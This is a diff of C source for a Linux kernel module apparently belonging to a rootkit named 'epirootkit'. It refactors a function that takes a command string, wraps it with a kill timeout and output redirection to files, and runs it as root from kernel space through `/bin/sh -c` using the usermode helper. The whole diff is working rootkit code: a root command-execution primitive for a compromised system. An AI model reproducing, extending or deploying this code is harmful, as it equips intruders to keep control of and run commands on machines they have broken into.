@@ -1,106 +1,166 @@
-#include <linux/kernel.h>
-#include <linux/kmod.h>
 #include <linux/slab.h>
+#include <linux/string.h>
+#include <linux/kmod.h>
+#include <linux/types.h>
 
 #include "epirootkit.h"
 
+static char *trim_leading_whitespace(char *str) {
+    while (*str == ' ' || *str == '\t' || *str == '\n')
+        str++;
+    return str;
+}
+
+static void detect_redirections(const char *cmd, bool *redirect_stdout, bool *redirect_stderr) {
+    char *redirect_stderr_add = strstr(cmd, "2>");
+    char *redirect_stdout_add = strstr(cmd, ">");
+
+    *redirect_stderr = (redirect_stderr_add != NULL);
+    *redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);
+}
+
+static char *build_timeout_prefix(int timeout) {
+    if (timeout <= 0)
+        return kstrdup("", GFP_KERNEL);
+
+    const char *base_cmd = "timeout --signal=SIGKILL --preserve-status";
+    int size = snprintf(NULL, 0, "%s %d", base_cmd, timeout);
+    char *timeout_cmd = kzalloc(size + 1, GFP_KERNEL);
+    if (!timeout_cmd)
+        return NULL;
+
+    snprintf(timeout_cmd, size + 1, "%s %d", base_cmd, timeout);
+    return timeout_cmd;
+}
+
 /**
- * @brief Executes a command string in user mode.
+ * build_full_command - Constructs a full command string with optional redirection.
  *
- * @param user_cmd A pointer to a null-terminated string containing the command to execute.
- * @param catch_stds A boolean flag indicating whether to catch standard output and error.
- * @return int - Returns 0 on success, -ENOMEM if memory allocation fails, or -ENOENT if the output file cannot be opened.
+ * @buffer: Pointer to the buffer where the constructed command will be stored.
+ * @buffer_size: Size of the buffer to ensure no overflow occurs.
+ * @timeout_cmd: The timeout command to prepend to the user command.
+ * @user_cmd: The user command to be executed.
+ * @redirect_stdout: Boolean flag indicating whether to redirect standard output.
+ * @redirect_stderr: Boolean flag indicating whether to redirect standard error.
+ * @catch_stds: Boolean flag indicating whether to catch standard output and error.
+ * @stdout_file: File path to redirect standard output (used if redirect_stdout is true).
+ * @stderr_file: File path to redirect standard error (used if redirect_stderr is true).
+ *
+ * This function constructs a command string based on the provided parameters.
+ * It supports optional redirection of standard output and/or standard error
+ * to specified files. If both `redirect_stdout` and `redirect_stderr` are true,
+ * or if `catch_stds` is false, no redirection is applied.
+ *
+ * Returns:
+ *   0 on success, or -EINVAL if the constructed command exceeds the buffer size.
  */
+static int build_full_command(char *buffer, size_t buffer_size,
+                              const char *timeout_cmd, const char *user_cmd,
+                              bool redirect_stdout, bool redirect_stderr,
+                              bool catch_stds, const char *stdout_file, const char *stderr_file) {
+    const char *format;
+
+    if ((redirect_stderr && redirect_stdout) || !catch_stds) {
+        format = "%s %s";
+        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd) >= buffer_size ? -EINVAL : 0;
+    } else if (redirect_stderr) {
+        format = "%s %s > %s";
+        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file) >= buffer_size ? -EINVAL : 0;
+    } else if (redirect_stdout) {
+        format = "%s %s 2> %s";
+        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stderr_file) >= buffer_size ? -EINVAL : 0;
+    } else {
+        format = "%s %s > %s 2> %s";
+        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file, stderr_file) >= buffer_size ? -EINVAL : 0;
+    }
+}
+
+static int execute_command(const char *cmd_str, char *envp[]) {
+    char *argv[] = { "/bin/sh", "-c", (char *)cmd_str, NULL };
+    struct subprocess_info *sub_info;
+
+    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
+    if (!sub_info)
+        return -ENOMEM;
+
+    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
+}
+
+
+/**
+ * exec_str_as_command_with_timeout - Executes a user-provided command string with a timeout.
+ *
+ * @user_cmd: The command string to execute. Leading whitespace will be trimmed.
+ * @catch_stds: A boolean indicating whether to redirect standard output and error.
+ * @timeout: The maximum time (in seconds) to allow the command to run before timing out.
+ *
+ * This function builds and executes a command string with optional redirection of
+ * standard output and error. It also enforces a timeout for the command execution.
+ * The function performs the following steps:
+ *   1. Allocates memory for the command buffer.
+ *   2. Detects redirection operators in the user-provided command.
+ *   3. Constructs a timeout-prefixed command string.
+ *   4. Builds the full command string with optional redirection and environment variables.
+ *   5. Executes the constructed command.
+ *   6. Frees allocated resources and returns the command's exit status.
+ *
+ * Return:
+ *   - On success, returns the exit status of the executed command.
+ *   - On failure, returns a negative error code (e.g., -ENOMEM for memory allocation failure).
+ *
+ * Notes:
+ *   - The function uses a static environment variable array (`envp`) to define
+ *     the execution environment for the command.
+ *   - The caller is responsible for ensuring that `user_cmd` is a valid, null-terminated string.
+ *   - The function logs debug messages for command execution and status.
+ */
+
 int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds, int timeout) {
-    struct subprocess_info *sub_info = NULL; // Structure used to spawn a userspace process
-    char *cmd = NULL;
-    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
-    char *envp[] = {
+    char *cmd_buffer = NULL;
+    char *timeout_cmd = NULL;
+    bool redir_stdout = false, redir_stderr = false;
+    int status = 0;
+
+    static char *envp[] = {
         "HOME=/",
         "TERM=xterm",
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/tmp",
         NULL
     };
-    char *stdout_file = STDOUT_FILE; // File to store stdout
-    char *stderr_file = STDERR_FILE; // File to store stderr
-    int status = 0;                  // Return code and number of bytes read
 
-    while (*user_cmd == ' ' || *user_cmd == '\t' || *user_cmd == '\n')
-        user_cmd++; // Skip leading whitespace
+    user_cmd = trim_leading_whitespace(user_cmd);
 
-    // Allocate memory for the command string
-    cmd = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!cmd)
+    cmd_buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    if (!cmd_buffer)
         return -ENOMEM;
 
-    // Check if the command contains redirection operators
-    // Needed because we usually redirect stdout and stderr to /tmp/std.out and /tmp/std.err
-    // If the user has specified redirection, we need to handle it
-    char *redirect_stderr_add = strstr(user_cmd, "2>"); // Check for stderr redirection
-    char *redirect_stdout_add = strstr(user_cmd, ">");  // Check for stdout redirection
-    bool user_redirect_stderr = (redirect_stderr_add != NULL);
-    bool user_redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);
+    detect_redirections(user_cmd, &redir_stdout, &redir_stderr);
 
-    // Construct timeout command
-    char *timeout_cmd;
-    if (timeout <= 0) {
-        timeout_cmd = "";
-    } else {
-        char base_cmd[] = "timeout --signal=SIGKILL --preserve-status";
-        int timeout_size = snprintf(NULL, 0, "%s %i", base_cmd, timeout);
-        timeout_cmd = kzalloc(timeout_size + 1, GFP_KERNEL);
-        if (!timeout_cmd) {
-            kfree(cmd);
-            return -ENOMEM;
-        }
-        snprintf(timeout_cmd, timeout_size + 1, "%s %i", base_cmd, timeout);
-    }
-
-
-    // Construct the full command string
-    const char *full_cmd_format;
-
-    if ((user_redirect_stderr && user_redirect_stdout) || !catch_stds) {
-        full_cmd_format = "%s %s";
-    } else if (user_redirect_stderr) {
-        full_cmd_format = "%s %s > %s";
-    } else if (user_redirect_stdout) {
-        full_cmd_format = "%s %s 2> %s";
-    } else {
-        full_cmd_format = "%s %s > %s 2> %s";
-    }
-
-    int required_size = snprintf(NULL, 0, full_cmd_format, timeout_cmd, user_cmd, stdout_file, stderr_file);
-    if (required_size >= STD_BUFFER_SIZE) {
-        DBG_MSG("Command too long!\n");
-        kfree(cmd);
-        if (timeout_cmd) 
-            kfree(timeout_cmd);
-        return -EINVAL;
-    }
-
-    snprintf(cmd, STD_BUFFER_SIZE, full_cmd_format, timeout_cmd, user_cmd, stdout_file, stderr_file);
-    
-
-    // Prepare the command arguments
-    argv[2] = cmd;
-
-    DBG_MSG("exec_str_as_command: executing command: %s\n", cmd);
-
-    // Prepare to run the command
-    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
-    if (!sub_info) {
-        kfree(cmd);
+    timeout_cmd = build_timeout_prefix(timeout);
+    if (!timeout_cmd) {
+        kfree(cmd_buffer);
         return -ENOMEM;
     }
 
-    // Execute the command and wait for it to finish
-    status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
+    status = build_full_command(cmd_buffer, STD_BUFFER_SIZE,
+                                 timeout_cmd, user_cmd,
+                                 redir_stdout, redir_stderr,
+                                 catch_stds, STDOUT_FILE, STDERR_FILE);
+
+    if (status < 0) {
+        DBG_MSG("Command too long or invalid\n");
+        kfree(cmd_buffer);
+        kfree(timeout_cmd);
+        return status;
+    }
+
+    DBG_MSG("exec_str_as_command: executing command: %s\n", cmd_buffer);
+
+    status = execute_command(cmd_buffer, envp);
     DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);
 
-    kfree(cmd);
-    if (timeout_cmd)
-        kfree(timeout_cmd);
+    kfree(cmd_buffer);
+    kfree(timeout_cmd);
 
     return status;
 }
